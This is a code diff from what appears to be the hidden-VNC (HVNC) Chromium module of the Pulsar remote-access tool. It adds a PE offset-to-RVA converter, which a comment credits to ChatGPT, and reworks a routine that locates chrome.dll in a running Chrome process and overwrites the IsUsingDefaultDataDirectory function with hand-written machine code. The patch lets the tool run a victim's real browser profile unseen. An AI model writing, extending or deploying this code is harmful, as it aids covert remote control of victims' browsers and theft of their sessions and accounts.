@@ -105,6 +105,90 @@ namespace Pulsar.Client.Helper.HVNC.Chromium
         }
 
         /// <summary>
+        /// Converts a file offset to a Relative Virtual Address (RVA)
+        /// </summary>
+        /// <param name="filePath">Path to the DLL or EXE file</param>
+        /// <param name="fileOffset">The file offset to convert</param>
+        /// <returns>The RVA corresponding to the file offset, or 0 if conversion fails</returns>
+        public static uint FileOffsetToRVA(string filePath, uint fileOffset)
+        {
+            // I admit when I'm defeated. This is 100% chatGPT. We were able to figure out offsets but not the RVA portion and automating a way to get the offset. (Thank you gpt4.1).
+            try
+            {
+                if (!File.Exists(filePath))
+                {
+                    Debug.WriteLine($"> ERROR: File '{filePath}' does not exist");
+                    return 0;
+                }
+
+                byte[] fileData = File.ReadAllBytes(filePath);
+                if (fileData.Length < 64)
+                {
+                    Debug.WriteLine("> ERROR: File is too small to be a valid PE file");
+                    return 0;
+                }
+
+                // Read DOS header to find PE header offset
+                uint peOffset = BitConverter.ToUInt32(fileData, 0x3C);
+                if (peOffset + 24 > fileData.Length)
+                {
+                    Debug.WriteLine("> ERROR: Invalid PE header offset");
+                    return 0;
+                }
+
+                // Verify PE signature
+                if (BitConverter.ToUInt32(fileData, (int)peOffset) != 0x00004550)  // "PE\0\0"
+                {
+                    Debug.WriteLine("> ERROR: Invalid PE signature");
+                    return 0;
+                }
+
+                // Get number of sections
+                ushort numSections = BitConverter.ToUInt16(fileData, (int)peOffset + 6);
+
+                // Find section headers offset (PE header + size of FileHeader + size of OptionalHeader)
+                uint sectionHeadersOffset = peOffset + 24 + BitConverter.ToUInt16(fileData, (int)peOffset + 20);
+
+                // Find the section that contains the file offset
+                for (int i = 0; i < numSections; i++)
+                {
+                    uint sectionOffset = sectionHeadersOffset + (uint)(i * 40); // Each section header is 40 bytes
+
+                    if (sectionOffset + 40 > fileData.Length)
+                    {
+                        Debug.WriteLine("> ERROR: Section header extends beyond file size");
+                        break;
+                    }
+
+                    uint pointerToRawData = BitConverter.ToUInt32(fileData, (int)sectionOffset + 20);
+                    uint sizeOfRawData = BitConverter.ToUInt32(fileData, (int)sectionOffset + 16);
+                    uint virtualAddress = BitConverter.ToUInt32(fileData, (int)sectionOffset + 12);
+
+                    // Check if file offset is within this section
+                    if (fileOffset >= pointerToRawData && fileOffset < pointerToRawData + sizeOfRawData)
+                    {
+                        // Calculate RVA by adding the offset within the section to the section's RVA
+                        uint offsetWithinSection = fileOffset - pointerToRawData;
+                        uint rva = virtualAddress + offsetWithinSection;
+
+                        Debug.WriteLine($"> Successfully converted file offset 0x{fileOffset:X} to RVA 0x{rva:X}");
+                        Debug.WriteLine($"> Section: {i + 1}, RawAddress: 0x{pointerToRawData:X}, VirtualAddress: 0x{virtualAddress:X}");
+
+                        return rva;
+                    }
+                }
+
+                Debug.WriteLine($"> ERROR: File offset 0x{fileOffset:X} not found in any section");
+                return 0;
+            }
+            catch (Exception ex)
+            {
+                Debug.WriteLine($"> ERROR in FileOffsetToRVA: {ex.Message}");
+                return 0;
+            }
+        }
+
+        /// <summary>
         /// Finds the offset of the target function in the chrome.dll
         /// </summary>
         private int FindMatchOffset(byte[] src)
@@ -219,7 +303,7 @@ namespace Pulsar.Client.Helper.HVNC.Chromium
                 Debug.WriteLine("> Loaded chrome.dll into chrome process");
 
                 // Wait a moment for the DLL to be fully loaded
-                System.Threading.Thread.Sleep(1000);
+                Thread.Sleep(1000);
 
                 IntPtr chromeDllBaseAddress = IntPtr.Zero;
                 Process targetProcess = Process.GetProcessById(pid);
@@ -227,46 +311,56 @@ namespace Pulsar.Client.Helper.HVNC.Chromium
                 // Refresh the process modules to ensure we see the newly injected DLL
                 targetProcess.Refresh();
 
-                Debug.WriteLine("> Searching for chrome.dll in process modules:");
+                Console.WriteLine("> Searching for chrome.dll in process modules:");
                 foreach (ProcessModule module in targetProcess.Modules)
                 {
-                    Debug.WriteLine("  Module: " + module.FileName);
+                    Console.WriteLine("  Module: " + module.FileName);
 
                     // Check both the filename and module name
                     if (module.FileName.ToLower().Contains("chrome.dll") ||
                         module.ModuleName.ToLower().Contains("chrome.dll"))
                     {
                         chromeDllBaseAddress = module.BaseAddress;
-                        Debug.WriteLine("> Found chrome.dll at address: {0:X}", (ulong)chromeDllBaseAddress);
+                        Console.WriteLine("> Found chrome.dll at address: {0:X}", (ulong)chromeDllBaseAddress);
                         break;
                     }
                 }
 
                 if (chromeDllBaseAddress == IntPtr.Zero)
                 {
-                    Debug.WriteLine("> ERROR: chrome.dll not found in process modules after injection");
-                    Debug.WriteLine("> Available modules:");
+                    Console.WriteLine("> ERROR: chrome.dll not found in process modules after injection");
+                    Console.WriteLine("> Available modules:");
                     foreach (ProcessModule module in targetProcess.Modules)
                     {
-                        Debug.WriteLine("    {0} (Base: {1:X})", module.FileName, (ulong)module.BaseAddress);
+                        Console.WriteLine("    {0} (Base: {1:X})", module.FileName, (ulong)module.BaseAddress);
                     }
                     return false;
                 }
+                Console.WriteLine("> Got address of chrome.dll: {0:X}", (ulong)chromeDllBaseAddress);
 
-                Debug.WriteLine("> Got address of chrome.dll: {0:X}", (ulong)chromeDllBaseAddress);
-                IntPtr targetFunction = IntPtr.Add(chromeDllBaseAddress, offset + 0x0A00);
-                Debug.WriteLine("> Calculated address of IsUsingDefaultDataDirectory function: {0:X}", (ulong)targetFunction);
+                // we need RVA to calc ts
+                string dllPath = ChromiumInstallFolderPath + "\\chrome.dll";
+                uint rva = FileOffsetToRVA(dllPath, (uint)offset);
+                if (rva == 0)
+                {
+                    Console.WriteLine("> ERROR: Failed to convert file offset to RVA");
+                    return false;
+                }
+
+                IntPtr targetFunction = IntPtr.Add(chromeDllBaseAddress, (int)rva);
+                Console.WriteLine("> Calculated address of IsUsingDefaultDataDirectory function: {0:X}", (ulong)targetFunction);
 
                 byte[] PatchBytes = new byte[] { 0x56, 0x48, 0x89, 0xCE, 0xB0, 0x01, 0x88, 0x06, 0x88, 0x46, 0x01, 0x5E, 0xC3 };
+                //byte[] PatchBytes = new byte[] { 0xb8, 0x01, 0x00, 0x00, 0x00, 0xc3 };
 
                 int bytesWritten = NativeMemory.WriteMemory(pid, targetFunction, PatchBytes);
-                Debug.WriteLine("> Wrote {0} bytes to memory", bytesWritten);
+                Console.WriteLine("> Wrote {0} bytes to memory", bytesWritten);
 
                 return bytesWritten == PatchBytes.Length;
             }
             catch (Exception ex)
             {
-                Debug.WriteLine("> ERROR in ApplyPatch: " + ex.Message);
+                Console.WriteLine("> ERROR in ApplyPatch: " + ex.Message);
                 return false;
             }
         }
